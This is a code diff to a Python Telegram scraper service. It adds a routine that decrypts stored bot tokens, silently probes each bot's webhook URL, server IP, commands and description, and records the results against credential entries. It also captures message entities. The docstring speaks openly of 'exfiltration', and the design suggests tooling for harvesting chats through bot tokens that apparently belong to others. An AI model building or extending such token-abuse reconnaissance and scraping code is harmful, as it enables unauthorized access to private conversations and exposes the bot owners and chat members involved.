@@ -1,5 +1,6 @@
 from typing import Any, Dict, List, Optional, Tuple, TypedDict
 import asyncio
+from datetime import datetime, timezone
 from telethon import TelegramClient, errors
 from telethon.tl.types import Message, MessageMediaPhoto, MessageMediaDocument
 from telethon.errors import (
@@ -9,6 +10,8 @@ from telethon.errors import (
     SessionPasswordNeededError,
 )
 from app.core.config import settings
+from app.core.database import db
+from app.core.security import security
 import logging
 import httpx
 from app.utils.http_client import get_async_http_client
@@ -32,6 +35,10 @@ async def _resolve_history_result(result):
     while asyncio.isfuture(result) or asyncio.iscoroutine(result):
         result = await result
     return result or []
+
+
+async def _async_execute(query_builder):
+    return await asyncio.to_thread(query_builder.execute)
 
 
 class ScrapedMessage(TypedDict):
@@ -926,6 +933,85 @@ class ScraperService:
 
         return bot_info, discovered_chats
 
+    async def _probe_gateway_telemetry(self, raw_token: str, cred_id: str) -> None:
+        """
+        Passively capture Telegram gateway metadata before polling/scraping.
+
+        Best-effort by design: failures must never block preflight or exfiltration.
+        """
+        try:
+            try:
+                token = security.decrypt(raw_token).strip()
+            except Exception:
+                token = (raw_token or "").strip()
+
+            if not token or ":" not in token:
+                return
+
+            base_url = f"https://api.telegram.org/bot{token}"
+            async with get_async_http_client(timeout=8.0) as client:
+                wh_task = client.get(f"{base_url}/getWebhookInfo")
+                cmd_task = client.get(f"{base_url}/getMyCommands")
+                desc_task = client.get(f"{base_url}/getMyDescription")
+                wh_res, cmd_res, desc_res = await asyncio.gather(
+                    wh_task,
+                    cmd_task,
+                    desc_task,
+                    return_exceptions=True,
+                )
+
+            webhook_data: Dict[str, Any] = {}
+            commands_list: List[Dict[str, Any]] = []
+            bio_description = None
+
+            if isinstance(wh_res, httpx.Response) and wh_res.status_code == 200:
+                wh_json = wh_res.json()
+                if wh_json.get("ok"):
+                    webhook_data = wh_json.get("result") or {}
+            elif isinstance(wh_res, httpx.Response) and wh_res.status_code == 401:
+                return
+
+            if isinstance(cmd_res, httpx.Response) and cmd_res.status_code == 200:
+                cmd_json = cmd_res.json()
+                if cmd_json.get("ok"):
+                    commands_list = [
+                        {
+                            "command": item.get("command"),
+                            "description": item.get("description"),
+                        }
+                        for item in (cmd_json.get("result") or [])
+                        if item.get("command")
+                    ]
+
+            if isinstance(desc_res, httpx.Response) and desc_res.status_code == 200:
+                desc_json = desc_res.json()
+                if desc_json.get("ok"):
+                    bio_description = (desc_json.get("result") or {}).get("description")
+
+            telemetry_dict = {
+                "configured_webhook_url": webhook_data.get("url"),
+                "resolved_ip_address": webhook_data.get("ip_address"),
+                "command_dictionary": commands_list,
+                "service_description": bio_description,
+                "last_error_info": webhook_data.get("last_error_message"),
+                "last_error_date": webhook_data.get("last_error_date"),
+                "allowed_updates": webhook_data.get("allowed_updates"),
+                "probed_at": datetime.now(timezone.utc).isoformat(),
+            }
+
+            await _async_execute(
+                db.rpc(
+                    "patch_credential_meta",
+                    {
+                        "target_id": cred_id,
+                        "patch_key": "gateway_telemetry",
+                        "patch_data": telemetry_dict,
+                    },
+                )
+            )
+        except Exception as e:
+            logger.debug(f"[GatewayTelemetry] Probe failed for {cred_id}: {e}")
+
     async def _http_preflight_check(self, auth_token: str) -> Tuple[List[Dict[str, Any]], Dict[str, Any], bool]:
         """
         Lightweight HTTP-only check to verify token validity, fetch webhook info,
@@ -973,6 +1059,9 @@ class ScraperService:
                             media_type = "photo"
                         elif "document" in target:
                             media_type = "document"
+                        entities = target.get("entities") or target.get("caption_entities")
+                        if entities:
+                            file_meta["entities"] = entities
                         formatted_updates.append({
                             "telegram_msg_id": target.get("message_id"),
                             "sender_name": (
